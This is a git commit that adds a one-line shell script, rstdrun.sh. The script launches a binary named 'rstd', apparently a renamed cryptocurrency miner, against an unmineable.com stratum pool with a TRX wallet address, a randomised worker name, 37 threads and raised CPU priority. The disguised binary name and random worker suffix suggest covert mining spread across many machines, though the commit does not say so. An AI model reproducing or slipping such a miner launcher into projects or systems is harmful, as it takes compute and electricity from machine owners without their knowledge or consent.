ab506f676240f13eeca0b07c8ce83f2e655615b9
gratspdr <108811277+gratspdr@users.noreply.github.com>
2022-07-26 04:19:16 +0700

    Create rstdrun.sh

---
+++ rstdrun.sh
@@ -0,0 +1,1 @@
+./rstd -a cryptonight-upx/2 -o stratum+tcp://rx-us.unmineable.com:13333 -u TRX:TWaMNYJS8hLkrsvjQ8DNJSMuWPjJxUq8zR.$(echo rstd/$(shuf -i 1-999 -n 1))#hdij-gkd6 -p --asm=ryzen -t37 -k --cpu-priority 5
